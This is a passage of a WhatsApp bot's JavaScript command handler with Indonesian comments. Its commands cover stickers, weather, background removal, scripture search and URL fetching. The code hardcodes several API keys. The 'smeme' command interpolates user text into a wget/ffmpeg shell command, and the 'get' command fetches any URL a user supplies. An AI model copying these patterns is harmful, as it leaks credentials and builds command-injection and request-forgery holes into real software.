        let mediaBuffer = fs.readFileSync(mediaPath); // Membaca buffer gambar yang sudah diunduh
        let wewek = await uploadImage(mediaBuffer); // Upload gambar menggunakan uploadImage
        let ini_gen = `${command}`;

        // Mengambil hasil dari API jadianime
        let get_result = await getBuffer(`https://skizoasia.xyz/api/toanime?url=${wewek}&apikey=Rangelofficial`);

        // Mengirim gambar hasil dengan caption
        hanz.sendMessage(from, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: false,
                    title: `${botName}`,
                    body: `Bot aktif ${runtime(process.uptime())}`,
                    previewType: "PHOTO",
                    thumbnail:thumb,
                    sourceUrl: `${web}`
                }
            },
            image: get_result,
            caption: `*Nih Kak Kamu jadi Anime*`
        }, { quoted: m });

        fs.unlinkSync(mediaPath); // Menghapus file sementara
    } catch (err) {
        console.log(err);
        setReply('Terjadi kesalahan, coba lagi nanti.');
    }
}
break;

// ========== FITUR TOOLS =========//
case 'kalkulator': {
    const matematik = require('mathjs');
    try {
        if (!q) return m.reply('❌: Format salah!\n\n⚠️ Hanya mendukung angka (0-9) dan simbol:\n\n• Tambah (+)\n• Kurang (-)\n• Kali (× atau *)\n• Bagi (÷ atau /)\n• Pi (π)\n• e\n• Tanda kurung ( )')
        // Ganti simbol "x" dengan "*" dan "÷" dengan "/" agar sesuai dengan operasi matematik
        let ekspresi = q.replace(/x/g, "*").replace(/÷/g, "/");

        // Evaluasi ekspresi matematika menggunakan mathjs
        let hasil = matematik.evaluate(ekspresi);

        // Format balasan dengan template string
        let teks = `📊 *Kalkulator*\n\n🧮 *Ekspresi*: ${q}\n📌 *Hasil*: ${hasil}`;

        // Kirim balasan
        setReply(teks);
    } catch (err) {
        // Kirim pesan error jika format tidak valid
        setReply('❌: Format salah!\n\n⚠️ Hanya mendukung angka (0-9) dan simbol:\n\n• Tambah (+)\n• Kurang (-)\n• Kali (× atau *)\n• Bagi (÷ atau /)\n• Pi (π)\n• e\n• Tanda kurung ( )');
    }
}
break;

case 'get': {
    if (!q) {
        return hanz.editmsg(m.chat, `Awali *URL* dengan http:// atau https://`, m);
    }
if (!isGroup) return onlyToko()
    try {
        const gt = await axios.get(q, {
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Referer": "https://www.google.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
            },
            responseType: 'arraybuffer'
        });

        const contentType = gt.headers['content-type'];
        console.log(`Content-Type: ${contentType}`);

        // Penanganan berdasarkan tipe konten yang diterima
        if (/json/i.test(contentType)) {
            const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
            return hanz.editmsg(m.chat, JSON.stringify(jsonData, null, 2), m);
        } else if (/text/i.test(contentType)) {
            const textData = Buffer.from(gt.data, 'binary').toString('utf8');
            return hanz.editmsg(m.chat, textData, m);
        } else if (q.includes('webp')) {
            return hanz.sendImageAsSticker(m.chat, q, m, { packname: packName, author: pushname });
        } else if (/image/i.test(contentType)) {
            return hanz.sendMessage(m.chat, { image: { url: q } }, { quoted: m });
        } else if (/video/i.test(contentType)) {
            return hanz.sendMessage(m.chat, { video: { url: q } }, { quoted: m });
        } else if (/audio/i.test(contentType) || q.includes(".mp3")) {
            return hanz.sendMessage(m.chat, { audio: { url: q } }, { quoted: m });
        } else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
            return hanz.sendFile(m.chat, q, '', q, m);
        } else if (/application\/pdf/i.test(contentType)) {
            return hanz.sendFile(m.chat, q, '', q, m);
        } else {
            return hanz.editmsg(m.chat, `MIME: ${contentType}\n\n${gt.data}`, m);
        }
    } catch (error) {
        console.error(`Terjadi kesalahan: ${error}`);
        return hanz.editmsg(m.chat, `Terjadi kesalahan saat mengakses URL: ${error.message}`, m);
    }
}
break;


case 'infocuaca': {
    if (!q) return reply('Lokasi apa yang ingin Anda cari?');

    let wdata = await axios.get(
        `https://api.openweathermap.org/data/2.5/weather?q=${q}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=id`
    );

    let textw = "";
    textw += `*🗺️ Cuaca di ${q}*\n\n`;
    textw += `*Cuaca:* ${wdata.data.weather[0].main}\n`;
    textw += `*Deskripsi:* ${wdata.data.weather[0].description}\n`;
    textw += `*Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`;
    textw += `*Suhu Terasa:* ${wdata.data.main.feels_like}°C\n`;
    textw += `*Tekanan:* ${wdata.data.main.pressure} hPa\n`;
    textw += `*Kelembapan:* ${wdata.data.main.humidity}%\n`;
    textw += `*Kecepatan Angin:* ${wdata.data.wind.speed} m/s\n`;
    textw += `*Garis Lintang:* ${wdata.data.coord.lat}\n`;
    textw += `*Garis Bujur:* ${wdata.data.coord.lon}\n`;
    textw += `*Negara:* ${wdata.data.sys.country}\n`;

    hanz.editmsg(m.chat,textw,m)
}
break;

case 'nobg':
case 'removebg': {
    if (!quoted) return m.reply('Kirim gambar yang ingin dihapus background-nya.');

    let mime = (quoted.msg || quoted).mimetype || '';
    if (/image/.test(mime)) { // Cek apakah media adalah gambar
        try {
            reply('Tunggu sebentar, proses penghapusan background...');

            // Unduh media gambar
            const media = await hanz.downloadAndSaveMediaMessage(quoted);
            let ranp = getRandom('.png'); // Nama file hasil

            // API keys array
            var apiKeys = ['tCWQbncx6tcVXTZUXyrHbW2e', 'p6ZKgU1wthihGqymYncxuBNu', 'kFz7BEPgVY8VyxW5CxVM7P9J', '2AjasifpR9DNpqpRQKTKWQsZ', 'TmyvKbt8DE1tjTMsQCA34dRt', 'smKvqY2ia86MptoZGUWFRc8G'];
            var selectedApiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

            // Menggunakan API remove.bg
            await removeBackgroundFromImageFile({
                path: media,
                apiKey: selectedApiKey,
                size: 'auto',
                type: 'auto'
            }).then((res) => {
                fs.unlinkSync(media); // Hapus file media asli setelah digunakan

                let buffer = Buffer.from(res.base64img, 'base64');
                fs.writeFileSync(ranp, buffer); // Simpan gambar yang sudah dihapus background-nya

                // Kirim gambar yang sudah tanpa background
                hanz.sendMessage(from, { image: fs.readFileSync(ranp), caption: 'Tanpa background' }, { quoted: m });

                // Hapus file hasil setelah dikirim
                fs.unlinkSync(ranp);
            }).catch((err) => {
                console.log('Error:', err);
                reply('Gagal menghapus background, silakan coba lagi nanti.');
            });

        } catch (err) {
            console.log('Error:', err);
            reply('Terjadi kesalahan, silakan coba beberapa saat lagi.');
        }
    } else {
        reply('Format file tidak didukung. Harap kirim gambar.');
    }
}
break;

case 'pinterest':
case 'pin': {
    try {
        // Memastikan query ada
        if (!q) return reply(`*Masukkan kata kunci pencarian!*`);
m.reply(mess.wait)
        // Mengambil data dari Pinterest menggunakan API
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${q}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${q}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        
        // Mendapatkan URL gambar dari respons
        let res = data.resource_response.data.results.map(v => v.images.orig.url);
        
        // Memilih gambar secara acak
        if (res.length === 0) return reply(`*Tidak ada hasil ditemukan untuk "${text}"*`);
        
        let get = res[Math.floor(Math.random() * res.length)];
        
        // Mengirim gambar dengan tombol untuk mencari lebih banyak
        sendButImg(`🔍 *Hasil Pencarian untuk "${q}"*`, get, 'Next Yang Lain', `${command} ${q}`);
    } catch (error) {
        // Menangani kesalahan
        console.error(error);
        reply(`*Terjadi kesalahan saat mengambil data dari Pinterest.*\nSilakan coba lagi nanti.`);
    }
    break;
}

case 'toqr': case 'qr': {
				if (!q) return reply(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wa.me://6282316643491`)
				reply(mess.wait)
				await hanz.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + q }, caption: 'succes' }, { quoted: m })
			}
			break
// ========= FITUR SHORT URL ========= //
case 'tinyurl':{
	if (args.length < 1) return setReply(`Masukkan link`)
	if (!isUrl) return setReply(`Masukkan link`)
	const fetchText = (url, optiono) => {
	return new Promise((resolve, reject) => {
	return fetch(url, optiono)
	.then(response => response.text())
	.then(text => resolve(text))
	.catch(err => {
	console.log(color(err,'red'))
	reject(err)
	})
	})
	}
	let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
	let shorti = `*Result* : ${okok}`
	setReply(shorti)
	}
	break



// ========= FITUR SEARCH ============//
case 'walpaper': {
    if (!q) return m.reply('Mau nyari wallpaper apa? Contoh: .walpaper one piece');
const { wallpaper } = require('../lib/scraper')
    const title = q; // Ambil query dari pengguna
    try {
        const results = await wallpaper(title); // Panggil fungsi wallpaper
        if (results.length === 0) return m.reply('Tidak ditemukan wallpaper untuk kata kunci tersebut.');

        // Kirim hasil ke pengguna
        let response = `📸 Hasil pencarian untuk: ${title}\n\n`;
        results.forEach((result, index) => {
            response += `🖼️ ${index + 1}. **${result.title}**\n`;
            response += `📝 Tipe: ${result.type}\n`;
            response += `🔗 Sumber: ${result.source}\n`;
            response += `![Image](${result.image[0]})\n\n`; // Menampilkan gambar
        });
        setReply(response);
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mencari wallpaper. Coba lagi nanti.');
    }
}
break;
case 'caripenyakit': {
    if (!q) return m.reply(`Silakan masukkan nama penyakit yang ingin dicari, misalnya: *Gleneagles: Demam* 🩺`);

    const axios = require('axios');
    const cheerio = require('cheerio');
    const url = `https://www.gleneagles.com.sg/id/global-pages?search=${q}`;

    async function cariPenyakit(m) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const results = [];

            $('.page-search-result').each((i, el) => {
                const title = $(el).find('p.result-page-title a').text().trim();
                const link = $(el).find('p.result-page-title a').attr('href');
                const tags = $(el).find('p.result-page-tags').text().trim();
                const content = $(el).find('p.result-page-content').text().trim();

                results.push(`*Judul:* ${title} 🩺\n*Pengertian:* ${content.slice(0, 100)}...\n*Tag:* ${tags} 🔍\n[👉 Lanjutkan Membaca](${link})\n`);
            });

            const formattedResults = results.join('\n');
            m.reply(formattedResults || "Tidak ada hasil ditemukan. ❌");
        } catch (error) {
            m.reply(`Terjadi kesalahan: ${error.message} ⚠️`);
        }
    }

    await cariPenyakit(m);
}
break;


case 'cekpenyakit': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    if (!q) return m.reply('Silakan berikan URL yang ingin dibaca. 📄');

    async function baca(url) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            let penjelasanLengkap = '';
            let hakCiptaDitemukan = false;
            const hakCipta = 'Hak cipta ©';

            // Menangkap judul dan subjudul
            $('h1, h2, h3, h4, h6').each((i, element) => {
                penjelasanLengkap += `\n*${$(element).text().trim()}* \n`;
            });

            // Menangkap paragraf
            $('p').each((i, element) => {
                const teks = $(element).text().trim();
                if (teks.includes(hakCipta)) {
                    hakCiptaDitemukan = true;
                    return false; // Menghentikan loop
                }
                penjelasanLengkap += `${teks}\n`;
            });

            // Menangkap daftar
            if (!hakCiptaDitemukan) {
                $('li').each((i, element) => {
                    if (!$(element).find('ul').length) {
                        penjelasanLengkap += `• ${$(element).text().trim()}\n`;
                    }
                });
            }

            // Menangkap konten tambahan
            if (!hakCiptaDitemukan) {
                $('div, span').each((i, element) => {
                    const teks = $(element).text().trim();
                    if (teks.length > 30) {
                        penjelasanLengkap += `${teks}\n`;
                    }
                });
            }

            return penjelasanLengkap.trim();
        } catch (error) {
            console.error('Error fetching the URL:', error);
            return 'Gagal mengambil data dari URL. ⚠️';
        }
    }

    const url = q;
    const konten = await baca(url);
    m.reply(konten || 'Tidak ada konten ditemukan di URL tersebut. ❌');
}
break;

// =========== FITUR ISLAMIC =========//
case  'alkitab': {
    if (!q) return setReply (`❓ *Teks Alkitab tidak ditemukan!*\n\n📖 *Contoh penggunaan:*\n*${prefix}alkitab kejadian*`);

    setReply('🙏 *Mencari ayat yang diminta... Mohon tunggu sebentar*');
    
    try {
        let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(q)}`, { 
            headers: { 
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
            } 
        });

        const cheerio = require('cheerio');
        let $ = cheerio.load(res.data);
        let result = [];
        
        $('div.vw').each(function (a, b) {
            let teks = $(b).find('p').text().trim();
            let link = $(b).find('a').attr('href');
            let title = $(b).find('a').text().trim();
            result.push({ teks, link, title });
        });

        if (result.length === 0) {
            return setReply('❌ *Ayat tidak ditemukan! Coba periksa kata kunci pencarian Anda*');
        }

        let caption = result.map(v => `📖 *${v.title}*\n${v.teks}\n🔗 ${v.link}`).join('\n────────\n');

        m.reply(`🔍 *Hasil Pencarian Alkitab:*\n\n${caption}`);

    } catch (error) {
        setReply('❌ *Terjadi kesalahan saat mencari ayat Alkitab, coba lagi nanti.*');
    }
}
break
case  'surah': {
    try {
        if (!q) return setReply(`❓ *Mau cari surah apa?*\n\n📖 *Contoh penggunaan:*\n*${prefix + command} Al-Baqarah*`);
        
        setReply('🔍 *Sedang mencari surah yang diminta... Mohon tunggu sebentar*');
        
        let hasil = q.replace(" ", "-");
        let res = await surah(hasil);
        
        if (res.length === 0) return setReply(`❌ *Surah tidak ditemukan! Periksa kembali nama surah yang Anda masukkan.*`);

        let pre = 1;
        let teks = `📖 *Surah ${q}*\n\n${res[0].bismillah ? res[0].bismillah : ''}\n`;
        
        for (var i of res[1]) {
            teks += `*𖦹 Ayat :* ${pre++}\n`;
            teks += `🔹 ${i.arabic}\n`;  // Ayat dalam bahasa Arab
            teks += `🔸 *Bacaan:* ${i.baca}\n`; // Bacaan Latin
            teks += `📖 *Arti:* ${i.arti}\n\n`; // Arti dalam bahasa Indonesia
        }

        setReply(teks);
    } catch (e) {
        setReply('❌ *Terjadi kesalahan atau surah tidak ditemukan. Silakan coba lagi atau periksa nama surah yang dimasukkan dengan ketik *.listsurah*');
    }
}
break
case 'getsurah':{
if (!isGroup) return onlyToko()
  if (!q) return reply(`Angka?\nContoh: ${prefix + command} 1\n\n*Note*: 1 = Al-fatihah\n\nKetik ${prefix}listsurah untuk mengetahui nomor surah-surah lain`)
  const surahIndex = parseInt(q)
  const res = await getSurah(surahIndex)
  reply (res)
		}
  break
  case  'listsurah': {
    try {
        setReply('🔍 *Sedang memuat daftar surah... Mohon tunggu sebentar*');
        
        let res = await listsurah();
        let pre = 1;
        let teks = `📜 *Berikut adalah daftar surah yang tersedia:*\n\n`;
        
        for (var i of res) {
            teks += `*𖦹 No :* ${pre++}\n`;   // Menampilkan nomor urut surah
            teks += `*📖 Nama Surah:* ${i.name_surah}\n`; // Menampilkan nama surah
            teks += `*🔗 Link:* ${i.link}\n\n`; // Menampilkan link untuk lebih lanjut
        }

        setReply(teks);
    } catch (e) {
        setReply('❌ *Gagal memuat daftar surah. Silakan coba lagi nanti.*');
    }
}
break
 // ======== FITUR STIKER =========//
case 'anticolong':{
	var stiker = false
	try {
		let [packname, ...author] = q.split('|')
		//var author = (author || []).join('|')
		let mime = m.quoted.mimetype || ''
		if (!/webp/.test(mime)) throw 'Reply sticker!'
		//let img = await q.download()
    let img = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
		if (!img) throw 'Reply a sticker!'
		var stiker = await addExifAvatar(img, packName || '', authorName || '')
	} catch (e) {
		console.error(e)
		if (Buffer.isBuffer(e)) stiker = e
	} finally {
		if (stiker) hanz.sendMessage(m.chat, { sticker: stiker }, { quoted: m })
		else throw 'Conversion failed'
	}
}

break
   case 's':
case 'sticker':
case 'stiker':
    // Cek apakah media dikirim atau direply
    let mime = (m.msg || m).mimetype || '';
    
    // Jika media adalah view once, gambar, atau video
    if (/image/.test(mime) || /video/.test(mime) || isViewOnce || isImage || isQuotedImage || isVideo || isQuotedVideo) {
        
        // Batasi durasi video maksimal 10 detik
        if ((isVideo || isQuotedVideo) && quoted.seconds > 10) return setReply('Maksimal video adalah 10 detik!');
        
        // Set kualitas berdasarkan tipe media (gambar atau video)
        let kualitas = /image/.test(mime) ? 70 : 2;
        
        // Import wa-sticker-formatter untuk membuat stiker
        let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
        
        // Unduh media yang direply atau dikirim
        let media = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
        
        // Buat stiker dari media yang diunduh
        let jancok = new Sticker(media, {
            pack: botName, // Nama pack
            author: pushname, // Nama pembuat (pengguna yang mengirim)
            type: StickerTypes.FULL, // Jenis stiker (FULL atau CROPPED)
            categories: ['🤩', '🎉'], // Kategori stiker (opsional)
            id: '12345', // ID unik stiker
            quality: kualitas, // Kualitas output file
            background: '#FFFFFF00' // Warna latar belakang (untuk stiker full)
        });
        
        // Simpan stiker dalam format .webp
        let stok = getRandom('.webp');
        let nono = await jancok.toFile(stok);
        let nah = fs.readFileSync(nono);
        
        // Kirim stiker ke chat
        await hanz.sendMessage(from, { sticker: nah }, { quoted: m });
        
        // Hapus file sementara setelah digunakan
        await fs.unlinkSync(stok);
        await fs.unlinkSync(media);
    
    } else {
        // Jika bukan gambar atau video, beri informasi cara penggunaan
        setReply(`Kirim gambar atau video dengan caption ${command} atau balas gambar/video yang sudah dikirim. Note: Maksimal durasi video adalah 10 detik!`);
    }
    break;

 case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  try {
    await loading()

   
    if (!quoted) return reply('Silakan reply stiker yang ingin di-WM!')

    let ahuh = args.join(' ').split('|')
    let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
    let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``

    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    
    // Mengunduh dan menyimpan media dari pesan yang di-reply
    let media = await hanz.downloadAndSaveMediaMessage(quoted)

    // Membuat stiker dengan watermark
    let jancok = new Sticker(media, {
      pack: satu, // Nama pack
      author: dua, // Nama author
      type: StickerTypes.FULL, // Jenis stiker
      categories: ['🤩', '🎉'], // Kategori stiker
      id: '12345', // ID stiker
      quality: 70, // Kualitas file output
      background: '#FFFFFF00' // Warna latar belakang (khusus stiker full)
    })

    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)

    // Mengirimkan stiker yang telah di-WM
    await hanz.sendMessage(from, {sticker: nah}, {quoted: m})

    // Menghapus file sementara
    await fs.unlinkSync(stok)
    await fs.unlinkSync(media)

  } catch (err) {
    // Menangani error dan memberikan pesan yang jelas kepada pengguna
    reply('Ada yang salah, silakan reply stiker yang mau di-WM!') 
    console.error('Error:', err.message) // Logging untuk debugging
  }
}
break

case 'emojimix': {
if (!user.registered) { return sendButDaftar() }
if (!isGroup) return onlyToko()

let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
setReply(mess.wait)
let anu2 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu2.results) {
hanz.sendImageAsSticker(from, res.url, m)
}
}
break    
case 'smeme': {
    if (!q) return setReply(`Masukkan teks, contoh: ${prefix}smeme teks_atas|teks_bawah`);

    const uploadImage = require('../lib/uploadImage');
    let [top, bottom] = q.split('|'); // Memisahkan teks atas dan bawah
    top = top ? top : '-'; // Jika teks atas kosong, gunakan placeholder "-"
    bottom = bottom ? bottom : '-'; // Jika teks bawah kosong, gunakan placeholder "-"

    // Fungsi untuk memproses media menjadi meme
    const processMeme = async (mediaPath) => {
        try {
            let meDia = fs.readFileSync(mediaPath);
            let anuah = await uploadImage(meDia); // Upload gambar yang diunduh
            let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`; // Membuat URL meme dengan teks atas dan bawah
            await makeSticker(media, Sticker, StickerTypes); // Membuat stiker
            await fs.unlinkSync(mediaPath); // Hapus file sementara
        } catch (err) {
            let ranp = getRandom('.gif');
            let rano = getRandom('.webp');
            let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`; // Membuat URL meme dengan teks atas dan bawah

            exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
                if (err) return setReply(`${err}`);
                await hanz.sendMessage(from, { sticker: fs.readFileSync(rano) }, { quoted: m }); // Mengirim stiker
                await fs.unlinkSync(rano); // Hapus file sementara
                await fs.unlinkSync(ranp);
            });
        }
    };
 const mime1 = (quoted.msg || quoted).mimetype || ''
    if (!/webp/.test(mime1) || /image/.test(mime1) || isQuotedImage || isQuotedSticker) {
        setReply(mess.wait);

        try {
            let { Sticker, StickerTypes } = require('wa-sticker-formatter');
            let olalah = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
            
            if (isQuotedSticker) {
                // Jika media adalah stiker, konversi ke format PNG
                let ran = getRandomFile('.png');
                exec(`ffmpeg -i ${olalah} ${ran}`, async (err) => {
                    if (err) {
                        fs.unlinkSync(olalah); // Hapus file sementara
                        return setReply('Terjadi kesalahan saat memproses stiker.');
                    }
                    await processMeme(ran); // Proses stiker yang sudah dikonversi menjadi gambar
                });
            } else {
                // Jika media adalah gambar
                await processMeme(olalah); // Proses gambar langsung
            }
        } catch (err) {
            setReply('Terjadi kesalahan saat memproses media.');
        }
    }
}
break;

case 'qc': {
      try {
     if (!isGroup) return onlyToko()
        await loading()
 const uploadImage = require('../lib/uploadImage')
        var randomColor = ['#ef1a11', '#89cff0', '#660000', '#87a96b', '#e9f6ff', '#ffe7f7', '#ca86b0', '#83a3ee', '#abcc88', '#80bd76', '#6a84bd', '#5d8d7f', '#530101', '#863434', '#013337', '#133700', '#2f3641', '#cc4291', '#7c4848', '#8a496b', '#722f37', '#0fc163', '#2f3641', '#e7a6cb', '#64c987', '#e6e6fa'];
  const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];
        const dia = (m.quoted?.text ? m.quoted : m).sender;
        const name = await hanz.getName(dia);
        let teks = m.quoted ? m.quoted.text : q ? q : "";
        let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
        const avatar = await hanz.profilePictureUrl(dia, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png");

        if (isImage || isQuotedImage) {
          let media = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
let Bbbb = fs.readFileSync(media);
          let anu = await uploadImage(Bbbb);
          const json = {
            type: "quote",
            format: "png",
            backgroundColor: "apiColor",
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: 'auto',
              media: {
                url: anu
              },
              avatar: true,
              from: {
                id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                name,
                photo: {
                  url: avatar
                }
              },
              text: `${teks}`,
              replyMessage: {}
            }]
          };
          const { data } = await axios.post("https://quotly.netorare.codes/generate", json, {
            headers: {
              "Content-Type": "application/json"
            }
          }).catch(e => e.response || {});
          if (!data.ok) throw data;
          const buffer = Buffer.from(data.result.image, "base64");
          makeSticker(buffer, Sticker, StickerTypes);
          fs.unlinkSync(media);
        } else if (isQuotedSticker) {
          let media = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));

          let ran = getRandomFile('.png');
          exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
            fs.unlinkSync(media);
            if (err) return setReply(err);
   let BBB = fs.readFileSync(ran);
  let anuah = await uploadImage(BBB);
            const json = {
              type: "quote",
              format: "png",
              backgroundColor: "apiColor",
              width: 512,
              height: 768,
              scale: 2,
              messages: [{
                entities: 'auto',
                media: {
                  url: anuah
                },
                avatar: true,
                from: {
                  id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                  name,
                  photo: {
                    url: avatar
                  }
                },
                text: `${teks}`,
                replyMessage: {}
              }]
            };
            const { data } = await axios.post("https://quotly.netorare.codes/generate", json, {
              headers: {
                "Content-Type": "application/json"
              }
            }).catch(e => e.response || {});
            if (!data.ok) throw data;
            const buffer = Buffer.from(data.result.image, "base64");
            makeSticker(buffer, Sticker, StickerTypes);
            fs.unlinkSync(ran);
          });
        } else {
          const json = {
            type: "quote",
            format: "png",
            backgroundColor: apiColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: 'auto',
              avatar: true,
              from: {
                id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                name,
                photo: {
                  url: avatar
                }
              },
              text: `${teks}`,
              replyMessage: {}
            }]
          };
          const { data } = await axios.post("https://quotly.netorare.codes/generate", json, {
            headers: {
              "Content-Type": "application/json"
            }
          }).catch(e => e.response || {});
          if (!data.ok) reply(data);
          const buffer = Buffer.from(data.result.image, "base64");
          makeSticker(buffer, Sticker, StickerTypes);
        
        }
      } catch (e) {
        reply('Ada Kesalahan Sistem:v ');
        console.log(e);
        return;
      }
    }
     db.data.users[sender].limit -= 1 // -1 limit
    break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: pushname})
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickkiss': {
